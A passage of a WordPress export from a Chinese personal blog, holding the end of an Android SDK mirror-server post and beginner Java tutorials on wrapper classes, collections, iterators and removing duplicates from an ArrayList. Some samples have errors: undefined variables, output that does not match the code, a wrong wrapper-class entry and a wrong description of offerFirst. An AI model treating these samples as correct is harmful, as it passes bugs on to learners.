大连东软信息学院镜像服务器地址:

<ul>
    <li><code>http://mirrors.neusoft.edu.cn</code> 端口：80</li>
</ul>

北京化工大学镜像服务器地址:

<ul>
    <li>IPv4: <code>http://ubuntu.buct.edu.cn/</code> 端口：80</li>
    <li>IPv4: <code>http://ubuntu.buct.cn/</code> 端口：80</li>
    <li>IPv6: <code>http://ubuntu.buct6.edu.cn/</code> 端口：80</li>
</ul>

上海GDG镜像服务器地址:

<ul>
    <li><code>http://sdk.gdgshanghai.com</code> 端口：8000</li>
</ul>

中国科学院开源协会镜像站地址:

<ul>
    <li><code>IPV4/IPV6: http://mirrors.opencas.cn</code> 端口：80</li>
    <li><code>IPV4/IPV6: http://mirrors.opencas.org</code> 端口：80</li>
    <li><code>IPV4/IPV6: http://mirrors.opencas.ac.cn</code> 端口：80</li>
</ul>

腾讯Bugly 镜像:

<ul>
    <li><code>http://android-mirror.bugly.qq.com</code> 端口：8080</li>
    <li>腾讯镜像使用方法: http://android-mirror.bugly.qq.com:8080/include/usage.html</li>
</ul>

&nbsp;
然后勾选<strong>Force https://... source to be fetched using http://...</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/S_U_N89OQIYIW935SVMFU.png" rel="attachment wp-att-916"><img class="alignnone size-full wp-image-916" src="https://www.nervgeek.com/wp-content/uploads/2016/02/S_U_N89OQIYIW935SVMFU.png" alt="S_%)U_N89OQIYIW935SVMFU" width="434" height="392" /></a>
检查之后点击Close保存退出，点击<strong> Packages</strong> -&gt; <strong>Reload</strong>，SDK便可以正常下载。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>914</wp:post_id>
		<wp:post_date><![CDATA[2016-02-18 13:22:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-18 05:22:40]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[android-sdk-manager%e5%9b%bd%e5%86%85%e6%97%a0%e6%b3%95%e4%b8%8b%e8%bd%bd%e6%9b%b4%e6%96%b0%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="android"><![CDATA[Android]]></category>
		<category domain="post_tag" nicename="android"><![CDATA[android]]></category>
		<category domain="post_tag" nicename="sdk"><![CDATA[SDK]]></category>
		<category domain="post_tag" nicename="%e5%ae%89%e5%8d%93"><![CDATA[安卓]]></category>
		<category domain="post_tag" nicename="%e6%9b%b4%e6%96%b0"><![CDATA[更新]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[230]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java的基本数据类型对象与包装类</title>
		<link>https://www.nervgeek.com/2016/02/18/java%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%95%b0%e6%8d%ae%e7%b1%bb%e5%9e%8b%e5%af%b9%e8%b1%a1%e4%b8%8e%e5%8c%85%e8%a3%85%e7%b1%bb/</link>
		<pubDate>Thu, 18 Feb 2016 15:45:27 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=923</guid>
		<description></description>
		<content:encoded><![CDATA[“万物皆对象”，Java是一个面向对象的语言，但我们平时使用int，string等基本数据类型却是不面向对象的，在日常开发环境中时有不便，所以便有了包装类来解决这个问题。
每个基本数据类型都有一个代表类，称为包装类，其对应关系为：
&nbsp;

<table style="height: 363px;" border="有" width="885">
<tbody>
<tr>
<td style="width: 160px; text-align: center;"><strong><span style="font-size: 14pt;">基本数据类型</span></strong></td>
<td style="width: 200px; text-align: center;"><strong><span style="font-size: 14pt;">包装类</span></strong></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">byte</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Byte</span></td>
</tr>
<tr>
<td style="width: 200px; text-align: center;"><span style="font-size: 12pt;">short</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">short</span></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">int</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Integer</span></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">long</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Long</span></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">boolean</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Boolean</span></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">float</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Float</span></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">double</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Double</span></td>
</tr>
<tr>
<td style="text-align: center;"><span style="font-size: 12pt;">char</span></td>
<td style="text-align: center;"><span style="font-size: 12pt;">Character</span></td>
</tr>
</tbody>
</table>

<!--more-->
除了Integer和Character，其余基本数据类型的包装类都是首字母大写就是包装类。
基本数据类型对象的包装类的最常见作用就是用于基本数据类型和字符串类型之间转换，例如：

<pre>/*
基本数据类型转成字符串。
 基本数据类型+"";
 or
 基本数据类型.toString(基本数据类型值);
*/
class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        int x = 110;
        sop(x+"");
        //假如直接sop(x);，编译时会提示类型不正确。
        sop(Integer.toString(x));
    }
}</pre>

&nbsp;

<pre>/*
字符串转成基本数据类型。
  double num = Double.parseDouble("12.23")
  boolean bool = Boolean.parseBollean("true");
  大概可以看出规律，每个包装类都有parseXxx这个方法。
*/
class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        String AgeS = "20";
        //AgeS是一个字符串，接下来转换成int进行数学运算
        int AgeI = Integer.parseInt(AgeS);
        if(age > 18){
            sop("Older then 18!");
        }
    }
}</pre>

&nbsp;
可以看出包装类解决了不少问题，下面再介绍几个常用的方法。
快速转换进制：

<pre>class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        int a = Integer.parseInt("110",2);
        int b = Integer.parseInt("3c",16);
        int c = Integer.parseInt("110",10);
        //第一个参数是要转换的字符串，第二个参数是转换成什么进制。
        sop(a+" "+b+" "+c);
        //输出 6 60 110
    }
}</pre>

查询Integer取值范围：

<pre>class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        sop("int MAX = "+Integer.MAX_VALUE+"，int MIN = "+Integer.MIN_VALUE);
    }
}</pre>

&nbsp;
下面介绍的方法是JDK 1.5新增的新方法：

<pre>class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        Integer x = 5;//自动装箱
        x = x + 5;//自动拆箱成int和5进行运算，然后自动装箱成Integer赋给x。
        sop(b+"");
    }
}</pre>

新增的特性：

<pre>class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        Integer x = 128;
        Integer y = 128;
        sop("x=y?"+(x==y));
        Integer a = 127;
        Integer b = 127;
        sop("a=b?"+(a==b));
        /*
            x=y?false
            a=b?true
        */
        /*
            java为了节约内存，赋值给Integer的数值范围在byte以内（-128~127），并数值已经存在（有相同的数值），多个变量都指向同一个内存空间。所以a和b数值皆为127，都指向同一个内存空间。
            对于这种情况，我们可以使用equals和compareTo两个方法来进行对比。
        */
        sop("x=y?"+(x.equals(y)));
        sop("x=y?"+(x.compareTo(y)));
        /*
            x=y?true
            x=y?0
        */
    }
}</pre>

Integer复写了equals方法：

<pre>class Java{
    public static void sop(String str){
        System.out.println(str);
    }
    public static void main(String args[]){
        Integer x = new Integer("20");
        Integer y = new Integer(20);
        sop("x=y? "+(x==y));
        sop("x.equals(y)? "+x.equals(y));
        //Integer复写了equals
        /*
            x=y? false
            x.equals(y)? true
        */
    }
}</pre>

&nbsp;
&nbsp;
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>923</wp:post_id>
		<wp:post_date><![CDATA[2016-02-18 23:45:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-18 15:45:27]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e7%9a%84%e5%9f%ba%e6%9c%ac%e6%95%b0%e6%8d%ae%e7%b1%bb%e5%9e%8b%e5%af%b9%e8%b1%a1%e4%b8%8e%e5%8c%85%e8%a3%85%e7%b1%bb]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="%e5%8c%85%e8%a3%85%e7%b1%bb"><![CDATA[包装类]]></category>
		<category domain="post_tag" nicename="%e5%9f%ba%e6%9c%ac%e6%95%b0%e6%8d%ae%e7%b1%bb%e5%9e%8b%e5%af%b9%e8%b1%a1"><![CDATA[基本数据类型对象]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[207]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java中集合类的概念以及使用方法</title>
		<link>https://www.nervgeek.com/2016/02/19/java%e4%b8%ad%e9%9b%86%e5%90%88%e7%b1%bb%e7%9a%84%e6%a6%82%e5%bf%b5%e4%bb%a5%e5%8f%8a%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/</link>
		<pubDate>Fri, 19 Feb 2016 12:38:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=937</guid>
		<description></description>
		<content:encoded><![CDATA[集合类，或者叫集合框架。集合类可以用于储存对象，例如一个人他有姓名、年龄、身高、体重等数据，封装之后就是一个对象。假如人多了，需要存储起来，我们可以使用集合类来存储对象。
听起来有点像数组，但集合类和数据区别非常大。首先数组长度不可变且只能保存同一种类型。集合类只用于储存对象，集合长度可变，又可以保存不同类型的对象。其次数组只能保存基本数据类型，集合则可以保存对象。
<strong>Java中集合类的关系图：</strong>
<img class="aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/02/26ce338d4458dbdf28d41f345d4940ed.bmp" alt="" />
集合框架在java.util中，属于java工具包的一员<!--more-->
根据上图可知，Collection接口下面有两个子接口List、Set，List和Set下面有自己的子类。

<table border="2">
<tbody>
<tr>
<td style="text-align: center;" colspan="2"><span style="font-size: 14pt;"><strong>List(元素有序且可以重复，该集合体系有索引)</strong></span></td>
</tr>
<tr>
<td style="width: 140px; text-align: center;">ArrayList</td>
<td>数据结构使用数组结构，动态数组。查询速度较快，插入、删除较慢。并且ArrayList是线程不同步。</td>
</tr>
<tr>
<td style="width: 140px; text-align: center;">LinkedList</td>
<td>使用的是链表数据结构。查询速度较慢，插入、删除较快。</td>
</tr>
<tr>
<td style="width: 140px; text-align: center;">Vector</td>
<td>一种老的动态数组，是线程同步的，效率很低，一般不赞成使用，所以图上也没有列出。</td>
</tr>
</tbody>
</table>

<table border="2">
<tbody>
<tr>
<td style="text-align: center;" colspan="2"><strong>Set(元素无序且不能重复，无索引)</strong></td>
</tr>
<tr>
<td style="width: 140px; text-align: center;">HashSet</td>
<td>以哈希表的形式存放元素，插入删除速度很快。</td>
</tr>
<tr>
<td style="width: 140px; text-align: center;">TreeSet</td>
<td>提供一个使用树结构存储Set接口的实现，对象以升序顺序存储，访问和遍历的时间很快。</td>
</tr>
</tbody>
</table>

&nbsp;
<span style="font-size: 18pt;"><strong>List特有的方法，ArrayList、LinkedList、Vector共有的方法：</strong></span>

<ul>
    <li><strong>增</strong></li>
    <li style="padding-left: 30px;"><code>add(index,element);</code></li>
    <li style="padding-left: 30px;"><code>addAll(index,Collection);</code></li>
    <li><strong>删</strong></li>
    <li style="padding-left: 30px;"><code>remove(index);</code></li>
    <li><strong>改</strong></li>
    <li style="padding-left: 30px;"><code>set(index);</code></li>
    <li><strong>查</strong></li>
    <li style="padding-left: 30px;"><code>get(index);</code></li>
    <li style="padding-left: 30px;"><code>subList(from,to);</code></li>
    <li style="padding-left: 30px;"><code>listIterator();</code></li>
</ul>

<strong>示例：</strong>

<pre>class ListDemo
    public static void main(String[] args){
        ArrayList al = new ArrayList();
        //添加元素
        al.add("Java01");
        al.add("Java02");
        al.add("Java03");
        al.add("Java04");
        sop(al);//输出
        //指定位置添加元素(插入)
        al.add(1,"Java99");
        sop(al);//输出
        //删除指定位置的元素
        al.remove(2);
        sop(al);//输出
        //修改元素
        al.set(0,"Java007");
        sop(al);//输出
        //通过下标获取元素
        sop(al.get(1));
        //获取所有元素
        for(int x = 0;x&lt;al.size();x++){
           sop("al("+x+") = "+al.get(x));
        }
        //迭代器
        Iterator it = al.iterator();
        while(it.hasNext()){
            sop(it.next());
        }
        //列表迭代器listIterator
        /*
            Iterator it = al.iterator();
            while(it.hasNext()){
                Object obj = it.next();
                if(obj.equals("Java02"))
                    al.add("Java008");
                在迭代时，不可以通过集合对象的方法操作作集合中的元素。
                会抛出concurrentmodificationexception异常。
                只能使用迭代器的方法来操作元素，但迭代器Iterator的方法只有
                next()、hasNext()、remove()三个
                所以我们需要使用迭代器的子接口listIterator来进行增、删、改、查、判断等操作
            }
            sop(al);
        */
        ListIterator li = al.listIterator();
        while(li.hasNext()){
            Object obj = li.next();
            if(obj.equals("Java007"))
                li.add("Java999");
        }
        sop("迭代时添加之后:"+al);
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

输出结果：

<pre>[Java01, Java02, Java03, Java04]
[Java01, Java99, Java02, Java03, Java04]
[Java01, Java99, Java03, Java04]
[Java007, Java99, Java03, Java04]
Java99
al(0) = Java007
al(1) = Java99
al(2) = Java03
al(3) = Java04
Java007
Java99
Java03
Java04
迭代时添加之后:[Java007, Java999, Java99, Java03, Java04]</pre>

&nbsp;
<span style="font-size: 18pt;"><strong>ArrayList使用例子：</strong></span>

<pre>import java.util.*;
class CollectionDemo{
    public static void main(String[] args){
        //创建一个集合容器，使用Collection接口的子类
        //ArrayList
        ArrayList al1 = new ArrayList();
        //添加元素
        al1.add("Java01");
        al1.add("Java02");
        al1.add("Java03");
        al1.add("Java04");
        //获取个数和集合长度
        sop("Size:"+al1.size());
        //打印集合
        sop(al1);
        //删除元素
        al1.remove("Java04");
        sop("已移除Java04："+al1);
        //判断元素
        sop("Java03是否存在："+al1.contains("Java03"));
        sop("集合是否为空："+al1.isEmpty());
        /*
            两个集合之间取交集
            取交集的那个集合仅保留有交集的元素
            假如和被交集的元素没有一个交集的话
            取交集的集合便为空
        */
        ArrayList al2 = new ArrayList();
        //al2添加元素
        al2.add("Java01");
        al2.add("Java02");
        al2.add("Java05");
        al2.add("Java06");
        //取交集
        al2.retainAll(al1);
        sop("al2与al1取交集："+al2);
        //al2取交集，最后仅保留有交集的元素
        //移除有交集的元素
        ArrayList al3 = new ArrayList();
        //al3添加元素
        al3.add("Java01");
        al3.add("Java02");
        al3.add("Java05");
        al3.add("Java06");
        al3.removeAll(al1);
        sop("al3删除与al1有交集的元素"+al3);
        //清除集合
        al1.clear();
        sop("已清除:"+al1);
        sop("集合是否为空："+al1.isEmpty());
}
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

<strong>输出结果：</strong>

<pre>Size:6
[Java01, Java02, Java03, Java04, 10]
已移除Java04：[Java01, Java02, Java03, 10]
Java03是否存在：true
集合是否为空：false
al2与al1取交集：[Java01, Java02]
al3删除与al1有交集的元素[Java05, Java06]
已清除:[]
集合是否为空：true</pre>

<strong>关于添加元素到集合时内存的变化：</strong>
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/WKO@J@EZR2J7CN6LGQAJ1.png" rel="attachment wp-att-949"><img class="size-full wp-image-949 aligncenter" src="https://www.nervgeek.com/wp-content/uploads/2016/02/WKO@J@EZR2J7CN6LGQAJ1.png" alt="(WKO&#96;@J@EZR2J7CN6LGQAJ1" width="623" height="496" /></a>
<strong>添加元素只是把元素的内存地址传给容器，不会把整个对象传给集合，不然会导致内存占用过大。</strong>
&nbsp;
<span style="font-size: 18pt;"><strong>LinkedList使用例子：</strong></span>
LinkedList有自己的特有方法

<ul>
    <li>在开头添加元素</li>
    <li style="padding-left: 30px;"><code>addFirst();</code></li>
    <li>在结尾添加元素</li>
    <li style="padding-left: 30px;"><code>addLast();</code></li>
    <li>获取第一个元素</li>
    <li style="padding-left: 30px;"><code>getFirst();</code></li>
    <li>获取最后一个元素</li>
    <li style="padding-left: 30px;"><code>getLast();</code></li>
    <li>删除第一个元素</li>
    <li style="padding-left: 30px;"><code>removeFirst();</code></li>
    <li>删除最后一个元素</li>
    <li style="padding-left: 30px;"><code>removeLast();</code></li>
</ul>

<strong>示例：</strong>

<pre>import java.util.*;
public class Main {
    public static void main(String[] args) {
        LinkedListDemo();
    }
    public static void LinkedListDemo(){
        LinkedList link = new LinkedList();
        //添加元素
        link.add("Java01");
        link.add("Java02");
        link.add("Java03");
        sop(link.add("Java04"));//添加成功返回true
        sop("原集合："+link);
        //在开头添加元素
        link.addFirst("Java00");
        sop("在集合开头添加："+link);
        //在结尾添加元素
        link.addLast("Java05");
        sop("在集合结尾添加："+link);
        //获取第一个元素
        sop("获取第一个元素"+link.getFirst());
        //获取最后一个元素
        sop("获取第一个元素"+link.getLast());
        //删除第一个元素
        sop("删除前集合："+link);
        sop("删除了："+link.removeFirst());//删除的同时可以获取元素
        sop("删除第一个元素之后的集合："+link);
        //删除最后一个元素
        sop("删除了："+link.removeLast());
        sop("删除最后一个元素之后的集合："+link);
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

<strong>输出结果：</strong>

<pre>true
原集合：[Java01, Java02, Java03, Java04]
在集合开头添加：[Java00, Java01, Java02, Java03, Java04]
在集合结尾添加：[Java00, Java01, Java02, Java03, Java04, Java05]
获取第一个元素Java00
获取第一个元素Java05
删除前集合：[Java00, Java01, Java02, Java03, Java04, Java05]
删除了：Java00
删除第一个元素之后的集合：[Java01, Java02, Java03, Java04, Java05]
删除了：Java05
删除最后一个元素之后的集合：[Java01, Java02, Java03, Java04]</pre>

根据上面LinkedList的代码可以发现：

<pre>sop("删除了："+link.removeFirst());//删除的同时可以获取元素</pre>

但假如此集合为空的时候，使用removeFirst()，会抛出一个空集合异常。
所以在1.6版本以后，出现了几个新方法来解决这个问题：

<ul>
    <li>获取元素，如果集合为空，则返回null</li>
    <li style="padding-left: 30px;"><code>peekFirst();</code></li>
    <li style="padding-left: 30px;"><code>peekLast();</code></li>
    <li>插入元素，如果集合为空，则返回null</li>
    <li style="padding-left: 30px;"><code>offerFirst();</code></li>
    <li style="padding-left: 30px;"><code>offerLast();</code></li>
    <li>获取元素并删除，如果集合为空，则返回null</li>
    <li style="padding-left: 30px;"><code>pollFirst();</code></li>
    <li style="padding-left: 30px;"><code>pollLast();</code></li>
</ul>

<strong>LinkedList模拟队列：</strong>

<pre>import java.util.*;
/*
* 使用LinkedList模拟一个堆栈或者队列的数据结构
*
* 堆栈：先进后出
* 队列：先进先出
*
*
*/
public class Main {
    public static void main(String[] args) {
        LinkedListDemo();
    }
    public static void LinkedListDemo(){
        Queue q = new Queue();
        q.addQ("Java01");
        q.addQ("Java02");
        q.addQ("Java03");
        q.addQ("Java04");
        while(!q.isEmpty()){
            sop(q.getQ());
        }
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}
class Queue{
    private LinkedList link;
    Queue(){
        link = new LinkedList();
    }
    public void addQ(Object obj){
        link.addFirst(obj);
    }
    public Object getQ(){
        return link.removeLast();
    }
    public boolean isEmpty(){
        return link.isEmpty();
    }
}</pre>

&nbsp;
&nbsp;
<strong>迭代器(Iterator)
</strong>
<span style="font-family: Arial;">迭代器是一种设计模式，它是一个对象，它可以遍历并选择序列中的对象，而开发人员不需要了解该序列的底层结构。迭代器通常被称为“轻量级”对象，因为创建它的代价小。</span>
<strong><span style="font-family: Arial;">Java中的Iterator功能比较简单，并且只能单向移动：</span></strong>

<ul>
    <li><span style="font-family: Arial;">使用方法iterator()要求容器返回一个Iterator。第一次调用Iterator的next()方法时，它返回序列的第一个元素。注意：iterator()方法是java.lang.Iterable接口,被Collection继承。</span></li>
    <li><span style="font-family: Arial;">使用next()获得序列中的下一个元素。</span></li>
    <li><span style="font-family: Arial;">使用hasNext()检查序列中是否还有元素。</span></li>
    <li><span style="font-family: Arial;">使用remove()将迭代器新返回的元素删除。
</span></li>
</ul>

<strong>示例：</strong>

<pre>class ItreatorDemo{
    public static void main(String[] args){
        ArrayList al1 = new ArrayList();
        //添加元素
        al1.add("Java01");
        al1.add("Java02");
        al1.add("Java03");
        al1.add("Java04");
        //获取迭代器，用于取出集合中的元素。
        Iterator it = al1.iterator();
        sop(it.next());
        sop(it.hasNext());
        while(it.hasNext()){
            sop(it.next());
        }
        /*
            for(Iterator it = al1.iterator();it.hasNext();){
                sop(it.next());
            }
            为it对象的作用域只在for循环内部，因此较为节省内存
        */
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>937</wp:post_id>
		<wp:post_date><![CDATA[2016-02-19 20:38:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-19 12:38:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e4%b8%ad%e9%9b%86%e5%90%88%e7%b1%bb%e7%9a%84%e6%a6%82%e5%bf%b5%e4%bb%a5%e5%8f%8a%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="arraylist"><![CDATA[ArrayList]]></category>
		<category domain="post_tag" nicename="collection"><![CDATA[Collection]]></category>
		<category domain="post_tag" nicename="hashset"><![CDATA[HashSet]]></category>
		<category domain="post_tag" nicename="iterator"><![CDATA[Iterator]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="linkedlist"><![CDATA[LinkedList]]></category>
		<category domain="post_tag" nicename="list"><![CDATA[List]]></category>
		<category domain="post_tag" nicename="set"><![CDATA[SET]]></category>
		<category domain="post_tag" nicename="treeset"><![CDATA[TreeSet]]></category>
		<category domain="post_tag" nicename="vector"><![CDATA[Vector]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e8%bf%ad%e4%bb%a3%e5%99%a8"><![CDATA[迭代器]]></category>
		<category domain="post_tag" nicename="%e9%9b%86%e5%90%88%e7%b1%bb"><![CDATA[集合类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[401]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Java的ArrayList练习-去除重复元素</title>
		<link>https://www.nervgeek.com/2016/02/20/java%e7%9a%84arraylist%e7%bb%83%e4%b9%a0-%e5%8e%bb%e9%99%a4%e9%87%8d%e5%a4%8d%e5%85%83%e7%b4%a0/</link>
		<pubDate>Sat, 20 Feb 2016 14:20:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=964</guid>
		<description></description>
		<content:encoded><![CDATA[上一篇文章学习到ArrayList，那现在来做一个小练习巩固一下。

<pre>package com.company;
import java.util.*;
public class Main {
    public static void main(String[] args) {
        ArrayListDemo();
    }
    public static void ArrayListDemo(){
        ArrayList al = new ArrayList();
        al.add("java01");
        al.add("java02");
        al.add("java03");
        al.add("java01");
        al.add("java04");
        al.add("java02");
        sop("有重复元素的集合"+al);
        al = singleElement(al);
        sop("去除重复后"+al);
    }
    public static ArrayList singleElement(ArrayList al){
        ArrayList tmpAl = new ArrayList();
        Iterator it = al.iterator();
        while (it.hasNext()){
            Object obj = it.next();
            if(!tmpAl.contains(obj)){
                tmpAl.add(obj);
            }else{
                sop(obj+"有相同元素，已移除！");
            }
        }
        return tmpAl;
    }
    public static void sop(Object obj){
        System.out.println(obj);
    }
}</pre>

输出结果：

<pre>有重复元素的集合[java01, java02, java03, java01, java04, java02]
java01有相同元素，已移除！
java02有相同元素，已移除！
去除重复后[java01, java02, java03, java04]</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>964</wp:post_id>
		<wp:post_date><![CDATA[2016-02-20 22:20:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-20 14:20:38]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[java%e7%9a%84arraylist%e7%bb%83%e4%b9%a0-%e5%8e%bb%e9%99%a4%e9%87%8d%e5%a4%8d%e5%85%83%e7%b4%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="arraylist"><![CDATA[ArrayList]]></category>
		<category domain="category" nicename="java"><![CDATA[Java]]></category>
		<category domain="post_tag" nicename="java"><![CDATA[Java]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e9%9b%86%e5%90%88"><![CDATA[集合]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
